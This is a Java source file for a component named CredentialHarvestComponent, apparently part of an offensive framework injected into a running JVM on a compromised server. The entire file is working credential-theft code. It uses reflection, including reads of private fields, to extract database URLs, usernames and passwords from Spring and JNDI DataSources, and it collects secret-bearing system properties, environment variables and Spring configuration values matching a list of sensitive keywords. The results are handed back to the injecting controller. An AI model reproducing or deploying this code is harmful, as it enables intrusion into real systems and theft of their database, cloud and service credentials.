package org.leo.core.component;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

/**
 * JVM 运行时凭据采集组件
 * <p>
 * 在 puppet 侧通过反射从 JVM 运行时提取敏感凭据信息，包括：
 * - Spring ApplicationContext 中的 DataSource Bean（JDBC URL / username / password）
 * - System Properties 中含敏感关键字的条目
 * - 环境变量中含敏感关键字的条目
 * - JNDI 绑定的 DataSource（java:comp/env/jdbc 等）
 * - Spring Environment 中的配置属性（从 PropertySource 中提取）
 * <p>
 * 兼容 Java 1.6+，仅使用 JDK 标准库 + 反射访问框架类。
 * 遵循 COMPONENT_GUIDE.md 约束：无 lambda、无匿名内部类、无 diamond operator。
 *
 * @author LeoSpring
 */
@SuppressWarnings({"rawtypes", "unchecked"})
public class CredentialHarvestComponent implements Runnable {

    private HashMap params;
    private HashMap results;

    // 操作类型
    private static final int OP_HARVEST_ALL = 0;
    private static final int OP_HARVEST_DATASOURCE = 1;
    private static final int OP_HARVEST_SYSTEM_PROPS = 2;
    private static final int OP_HARVEST_ENV = 3;
    private static final int OP_HARVEST_JNDI = 4;
    private static final int OP_HARVEST_SPRING_ENV = 5;

    // 敏感关键字（小写匹配）
    private static final String[] SENSITIVE_KEYWORDS = {
            "password", "passwd", "pass", "secret", "token", "apikey",
            "api_key", "api-key", "access_key", "accesskey",
            "secret_key", "secretkey", "private_key", "privatekey",
            "credential", "auth", "jdbc", "datasource", "connection",
            "redis", "mongo", "mysql", "oracle", "postgres",
            "mq", "rabbit", "kafka", "zookeeper",
            "nacos", "apollo", "sentinel",
            "oss", "s3", "minio", "cos",
            "smtp", "mail", "email"
    };


    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    public void invoke() throws Exception {
        int op = getIntParam("op", OP_HARVEST_ALL);

        HashMap allResults = new HashMap();

        switch (op) {
            case OP_HARVEST_ALL:
                safeHarvest(allResults, "dataSources", 1);
                safeHarvest(allResults, "systemProperties", 2);
                safeHarvest(allResults, "envVars", 3);
                safeHarvest(allResults, "jndiDataSources", 4);
                safeHarvest(allResults, "springEnvProperties", 5);
                break;
            case OP_HARVEST_DATASOURCE:
                allResults.put("dataSources", harvestDataSources());
                break;
            case OP_HARVEST_SYSTEM_PROPS:
                allResults.put("systemProperties", harvestSystemProperties());
                break;
            case OP_HARVEST_ENV:
                allResults.put("envVars", harvestEnvVars());
                break;
            case OP_HARVEST_JNDI:
                allResults.put("jndiDataSources", harvestJndi());
                break;
            case OP_HARVEST_SPRING_ENV:
                allResults.put("springEnvProperties", harvestSpringEnv());
                break;
            default:
                results.put("code", 400);
                results.put("msg", "unsupported op: " + op);
                return;
        }

        results.put("code", 200);
        results.put("credentials", allResults);
    }

    /**
     * 安全执行某一采集任务，异常不中断全局
     */
    private void safeHarvest(HashMap allResults, String key, int opType) {
        try {
            Object result = null;
            switch (opType) {
                case 1: result = harvestDataSources(); break;
                case 2: result = harvestSystemProperties(); break;
                case 3: result = harvestEnvVars(); break;
                case 4: result = harvestJndi(); break;
                case 5: result = harvestSpringEnv(); break;
            }
            if (result != null) {
                allResults.put(key, result);
            }
        } catch (Exception e) {
            HashMap errInfo = new HashMap();
            errInfo.put("error", e.getClass().getName() + ": " + e.getMessage());
            allResults.put(key, errInfo);
        }
    }

    // ==================== 1. Spring DataSource Bean 采集 ====================

    private ArrayList harvestDataSources() throws Exception {
        ArrayList dataSourceList = new ArrayList();
        Object context = getSpringContext();
        if (context == null) {
            return dataSourceList;
        }

        // 获取 DataSource 类型的所有 bean
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Class dsClass = null;
        try {
            dsClass = cl.loadClass("javax.sql.DataSource");
        } catch (Exception e) {
            try {
                dsClass = cl.loadClass("jakarta.sql.DataSource");
            } catch (Exception ignored) {
                return dataSourceList;
            }
        }

        Map beanMap = (Map) invokeMethod(context, "getBeansOfType",
                new Class[]{Class.class}, new Object[]{dsClass});

        if (beanMap == null || beanMap.isEmpty()) {
            return dataSourceList;
        }

        Iterator it = beanMap.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry entry = (Map.Entry) it.next();
            String beanName = (String) entry.getKey();
            Object ds = entry.getValue();
            HashMap dsInfo = extractDataSourceInfo(beanName, ds);
            if (dsInfo != null) {
                dataSourceList.add(dsInfo);
            }
        }

        return dataSourceList;
    }

    /**
     * 通过反射提取 DataSource 的连接信息
     * 支持 HikariCP、Druid、DBCP、Tomcat JDBC、Spring DriverManagerDataSource 等
     */
    private HashMap extractDataSourceInfo(String beanName, Object ds) {
        HashMap info = new HashMap();
        info.put("beanName", beanName);
        info.put("className", ds.getClass().getName());

        // 尝试常见 getter 方法名
        String[][] getterPairs = {
                {"url",      "getJdbcUrl"},
                {"url",      "getUrl"},
                {"url",      "getURL"},
                {"username", "getUsername"},
                {"username", "getUser"},
                {"password", "getPassword"},
                {"driverClassName", "getDriverClassName"},
                {"driverClass", "getDriverClass"},
                {"maxPoolSize", "getMaximumPoolSize"},
                {"maxPoolSize", "getMaxActive"},
                {"minPoolSize", "getMinimumIdle"},
                {"minPoolSize", "getMinIdle"},
        };

        for (int i = 0; i < getterPairs.length; i++) {
            String key = getterPairs[i][0];
            String methodName = getterPairs[i][1];
            if (!info.containsKey(key)) {
                try {
                    Object val = invokeMethod(ds, methodName);
                    if (val != null) {
                        info.put(key, String.valueOf(val));
                    }
                } catch (Exception ignored) {
                    // getter 不存在，跳过
                }
            }
        }

        // 如果 getter 取不到，尝试直接读字段
        if (!info.containsKey("url")) {
            String[] urlFields = {"jdbcUrl", "url", "URL"};
            for (int i = 0; i < urlFields.length; i++) {
                try {
                    Object val = getFieldValue(ds, urlFields[i]);
                    if (val != null) {
                        info.put("url", String.valueOf(val));
                        break;
                    }
                } catch (Exception ignored) {
                }
            }
        }

        if (!info.containsKey("username")) {
            String[] userFields = {"username", "user"};
            for (int i = 0; i < userFields.length; i++) {
                try {
                    Object val = getFieldValue(ds, userFields[i]);
                    if (val != null) {
                        info.put("username", String.valueOf(val));
                        break;
                    }
                } catch (Exception ignored) {
                }
            }
        }

        if (!info.containsKey("password")) {
            try {
                Object val = getFieldValue(ds, "password");
                if (val != null) {
                    info.put("password", String.valueOf(val));
                }
            } catch (Exception ignored) {
            }
        }

        // 至少有 url 或 username 才算有效
        if (info.containsKey("url") || info.containsKey("username")) {
            return info;
        }
        return null;
    }

    // ==================== 2. System Properties 采集 ====================

    private ArrayList harvestSystemProperties() {
        ArrayList result = new ArrayList();
        String customFilter = getStringParam("filter");
        Properties props = System.getProperties();
        Iterator it = props.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry entry = (Map.Entry) it.next();
            String key = String.valueOf(entry.getKey());
            String value = String.valueOf(entry.getValue());
            if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
                HashMap item = new HashMap();
                item.put("key", key);
                item.put("value", value);
                result.add(item);
            }
        }
        return result;
    }

    // ==================== 3. 环境变量采集 ====================

    private ArrayList harvestEnvVars() {
        ArrayList result = new ArrayList();
        String customFilter = getStringParam("filter");
        Map env = System.getenv();
        Iterator it = env.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry entry = (Map.Entry) it.next();
            String key = String.valueOf(entry.getKey());
            String value = String.valueOf(entry.getValue());
            if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
                HashMap item = new HashMap();
                item.put("key", key);
                item.put("value", value);
                result.add(item);
            }
        }
        return result;
    }

    // ==================== 4. JNDI DataSource 采集 ====================

    private ArrayList harvestJndi() {
        ArrayList result = new ArrayList();
        String[] jndiPaths = {
                "java:comp/env/jdbc",
                "java:comp/env",
                "java:/jdbc",
                "jdbc"
        };

        for (int i = 0; i < jndiPaths.length; i++) {
            try {
                Object initCtx = newInitialContext();
                if (initCtx == null) break;

                Object namingEnum = invokeMethod(initCtx, "list",
                        new Class[]{String.class}, new Object[]{jndiPaths[i]});

                if (namingEnum != null) {
                    while (((Boolean) invokeMethod(namingEnum, "hasMore")).booleanValue()) {
                        Object binding = invokeMethod(namingEnum, "next");
                        String name = (String) invokeMethod(binding, "getName");
                        String fullPath = jndiPaths[i] + "/" + name;

                        try {
                            Object looked = invokeMethod(initCtx, "lookup",
                                    new Class[]{String.class}, new Object[]{fullPath});

                            HashMap entry = new HashMap();
                            entry.put("jndiPath", fullPath);
                            entry.put("className", looked.getClass().getName());

                            // 尝试提取 DataSource 连接信息
                            HashMap dsInfo = extractDataSourceInfo(fullPath, looked);
                            if (dsInfo != null) {
                                entry.put("connectionInfo", dsInfo);
                            }
                            result.add(entry);
                        } catch (Exception ignored) {
                        }
                    }
                }
                invokeMethod(initCtx, "close");
            } catch (Exception ignored) {
                // JNDI 路径不存在或无权限，跳过
            }
        }
        return result;
    }

    // ==================== 5. Spring Environment 属性采集 ====================

    private ArrayList harvestSpringEnv() throws Exception {
        ArrayList result = new ArrayList();
        Object context = getSpringContext();
        if (context == null) {
            return result;
        }

        Object environment;
        try {
            environment = invokeMethod(context, "getEnvironment");
        } catch (Exception e) {
            return result;
        }

        // 获取 MutablePropertySources
        Object propertySources;
        try {
            propertySources = invokeMethod(environment, "getPropertySources");
        } catch (Exception e) {
            return result;
        }

        // 遍历 PropertySource
        Iterator it;
        try {
            it = ((Iterable) propertySources).iterator();
        } catch (Exception e) {
            return result;
        }

        String customFilter = getStringParam("filter");

        while (it.hasNext()) {
            Object propertySource = it.next();
            try {
                String sourceName = (String) invokeMethod(propertySource, "getName");
                Object source = invokeMethod(propertySource, "getSource");

                if (source instanceof Map) {
                    Iterator entryIt = ((Map) source).entrySet().iterator();
                    while (entryIt.hasNext()) {
                        Map.Entry entry = (Map.Entry) entryIt.next();
                        String key = String.valueOf(entry.getKey());
                        if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
                            // 通过 environment.getProperty() 获取解析后的值（支持占位符解析）
                            String resolvedValue = null;
                            try {
                                resolvedValue = (String) invokeMethod(environment, "getProperty",
                                        new Class[]{String.class}, new Object[]{key});
                            } catch (Exception ignored) {
                                Object rawVal = entry.getValue();
                                resolvedValue = rawVal != null ? String.valueOf(rawVal) : null;
                            }

                            if (resolvedValue != null) {
                                HashMap item = new HashMap();
                                item.put("key", key);
                                item.put("value", resolvedValue);
                                item.put("source", sourceName);
                                result.add(item);
                            }
                        }
                    }
                }

                // 处理 Properties 类型的 source（如 systemProperties）
                if (source instanceof Properties) {
                    Iterator propIt = ((Properties) source).entrySet().iterator();
                    while (propIt.hasNext()) {
                        Map.Entry entry = (Map.Entry) propIt.next();
                        String key = String.valueOf(entry.getKey());
                        if (isSensitiveKey(key) || (customFilter != null && key.toLowerCase().contains(customFilter.toLowerCase()))) {
                            String resolvedValue = null;
                            try {
                                resolvedValue = (String) invokeMethod(environment, "getProperty",
                                        new Class[]{String.class}, new Object[]{key});
                            } catch (Exception ignored) {
                                resolvedValue = String.valueOf(entry.getValue());
                            }
                            if (resolvedValue != null) {
                                HashMap item = new HashMap();
                                item.put("key", key);
                                item.put("value", resolvedValue);
                                item.put("source", sourceName);
                                result.add(item);
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
                // 某个 PropertySource 解析失败，跳过
            }
        }

        return result;
    }

    // ==================== 工具方法 ====================

    /**
     * 获取 Spring ApplicationContext。
     *
     * <p>四条路径降级，确保 idle Spring Boot 部署 / puppet 注入全局 CL 等场景都能拿到 context：
     * <ol>
     *   <li>RequestContextHolder（请求线程才有效）</li>
     *   <li>LiveBeansView.applicationContexts（Spring 5.x 静态字段，6+ 移除）</li>
     *   <li>SpringApplication.context 静态字段（Spring Boot 主入口）</li>
     *   <li><b>Tomcat MBean 兜底</b>：查 {@code Catalina:j2eeType=WebModule,*} 拿到 StandardContext，
     *       走 {@code getServletContext()} → {@code WebApplicationContextUtils.getWebApplicationContext()}</li>
     * </ol>
     */
    private Object getSpringContext() {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();

        // 方式1：通过 RequestContextHolder -> HttpServletRequest -> Session -> ServletContext
        try {
            Object requestAttributes = invokeMethod(
                    cl.loadClass("org.springframework.web.context.request.RequestContextHolder"),
                    "getRequestAttributes");
            Object request = invokeMethod(requestAttributes, "getRequest");
            Object session = invokeMethod(request, "getSession");
            Object servletContext = invokeMethod(session, "getServletContext");

            Object ctx = null;
            try {
                ctx = invokeMethod(
                        cl.loadClass("org.springframework.web.context.support.WebApplicationContextUtils"),
                        "getWebApplicationContext",
                        new Class[]{cl.loadClass("javax.servlet.ServletContext")},
                        new Object[]{servletContext});
            } catch (Exception ignored) {
                ctx = invokeMethod(
                        cl.loadClass("org.springframework.web.context.support.WebApplicationContextUtils"),
                        "getWebApplicationContext",
                        new Class[]{cl.loadClass("jakarta.servlet.ServletContext")},
                        new Object[]{servletContext});
            }
            if (ctx != null) return ctx;
        } catch (Exception ignored) {
        }

        // 方式2：通过 LiveBeansView.applicationContexts
        try {
            Set appContexts = (Set) getFieldValue(
                    cl.loadClass("org.springframework.context.support.LiveBeansView").newInstance(),
                    "applicationContexts");
            if (appContexts != null && !appContexts.isEmpty()) {
                return appContexts.iterator().next();
            }
        } catch (Exception ignored) {
        }

        // 方式3：通过 SpringApplication 的 context 静态字段（Spring Boot 特有）
        try {
            Class springAppClass = cl.loadClass("org.springframework.boot.SpringApplication");
            Object ctx = getFieldValue(springAppClass, "context");
            if (ctx != null) return ctx;
        } catch (Exception ignored) {
        }

        // 方式4（兜底）：通过 Tomcat JMX MBean 反推
        // 解决 idle Tomcat 部署 + puppet 注入全局 CL 时前三条路径全失效
        try {
            Object ctx = getSpringContextFromTomcat(cl);
            if (ctx != null) return ctx;
        } catch (Throwable ignored) {
        }

        return null;
    }

    /**
     * 通过 Tomcat 反推 Spring WebApplicationContext。
     * 优先复用同进程内已加载的 TomcatCatalinaManageComponent.getContext()，
     * 不可用时自己走 PlatformMBeanServer 查 Catalina:j2eeType=WebModule,*。
     */
    private static Object getSpringContextFromTomcat(ClassLoader cl) throws Throwable {
        HashSet standardContexts = null;
        try {
            Class tomcatComp = cl.loadClass("org.leo.core.component.TomcatCatalinaManageComponent");
            Method getCtx = tomcatComp.getDeclaredMethod("getContext");
            getCtx.setAccessible(true);
            standardContexts = (HashSet) getCtx.invoke(null);
        } catch (Throwable ignored) {
            // 退化到自己走 MBean
            standardContexts = queryTomcatContexts();
        }
        if (standardContexts == null || standardContexts.isEmpty()) return null;

        // 从 ServletContext 走 WebApplicationContextUtils.getWebApplicationContext()
        Class waCtxUtils = cl.loadClass("org.springframework.web.context.support.WebApplicationContextUtils");
        // 优先 javax.servlet 签名（Tomcat 9 及之前 / Spring 5.x），失败试 jakarta.servlet（Tomcat 10+ / Spring 6+）
        Method getViaJavax = null;
        Method getViaJakarta = null;
        try {
            getViaJavax = waCtxUtils.getMethod("getWebApplicationContext", cl.loadClass("javax.servlet.ServletContext"));
        } catch (Throwable ignored) {
        }
        try {
            getViaJakarta = waCtxUtils.getMethod("getWebApplicationContext", cl.loadClass("jakarta.servlet.ServletContext"));
        } catch (Throwable ignored) {
        }

        Iterator iter = standardContexts.iterator();
        while (iter.hasNext()) {
            Object stdCtx = iter.next();
            try {
                Method getServletCtx = stdCtx.getClass().getMethod("getServletContext");
                Object servletCtx = getServletCtx.invoke(stdCtx);
                if (servletCtx == null) continue;
                Object waCtx = null;
                if (getViaJavax != null) {
                    try { waCtx = getViaJavax.invoke(null, servletCtx); } catch (Throwable ignored) {}
                }
                if (waCtx == null && getViaJakarta != null) {
                    try { waCtx = getViaJakarta.invoke(null, servletCtx); } catch (Throwable ignored) {}
                }
                if (waCtx != null) return waCtx;
            } catch (Throwable ignored) {
                // 这个 context 不是 Spring 应用，跳过
            }
        }
        return null;
    }

    /** 自己查 Tomcat WebModule MBean 拿 StandardContext。 */
    private static HashSet queryTomcatContexts() throws Throwable {
        HashSet ctxs = new HashSet();
        Class mfClass = Class.forName("java.lang.management.ManagementFactory");
        Object mbs = mfClass.getMethod("getPlatformMBeanServer").invoke(null);
        Class onClass = Class.forName("javax.management.ObjectName");
        Object pattern = onClass.getConstructor(String.class).newInstance("Catalina:j2eeType=WebModule,*");
        Method queryNames = mbs.getClass().getMethod("queryNames", onClass, Class.forName("javax.management.QueryExp"));
        Set names = (Set) queryNames.invoke(mbs, pattern, null);
        if (names == null) return ctxs;
        Method getAttribute = mbs.getClass().getMethod("getAttribute", onClass, String.class);
        Iterator iter = names.iterator();
        while (iter.hasNext()) {
            try {
                Object on = iter.next();
                Object ctx = getAttribute.invoke(mbs, on, "managedResource");
                if (ctx != null) ctxs.add(ctx);
            } catch (Throwable ignored) {
            }
        }
        return ctxs;
    }

    /**
     * 创建 JNDI InitialContext
     */
    private Object newInitialContext() {
        try {
            return Class.forName("javax.naming.InitialContext").newInstance();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 判断 key 是否包含敏感关键字
     */
    private boolean isSensitiveKey(String key) {
        if (key == null) return false;
        String lower = key.toLowerCase();
        for (int i = 0; i < SENSITIVE_KEYWORDS.length; i++) {
            if (lower.contains(SENSITIVE_KEYWORDS[i])) {
                return true;
            }
        }
        return false;
    }

    // ==================== 参数提取 ====================

    private String getStringParam(String key) {
        Object val = params.get(key);
        return val != null ? String.valueOf(val) : null;
    }

    private int getIntParam(String key, int defaultVal) {
        Object val = params.get(key);
        if (val == null) return defaultVal;
        if (val instanceof Number) return ((Number) val).intValue();
        try { return Integer.parseInt(String.valueOf(val)); }
        catch (NumberFormatException e) { return defaultVal; }
    }

    // ==================== 反射工具 ====================

    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return (obj instanceof Class) ? field.get(null) : field.get(obj);
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    private static Object invokeMethod(Object obj, String methodName) throws Exception {
        return invokeMethod(obj, methodName, new Class[0], new Object[0]);
    }

    private static Object invokeMethod(Object obj, String methodName,
                                        Class[] paramTypes, Object[] args) throws Exception {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramTypes == null || paramTypes.length == 0) {
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName)
                                && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramTypes);
                }
            } catch (NoSuchMethodException e) {
                // continue
            }
            if (method == null) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            return method.invoke(null, args);
        }
        return method.invoke(obj, args);
    }
}
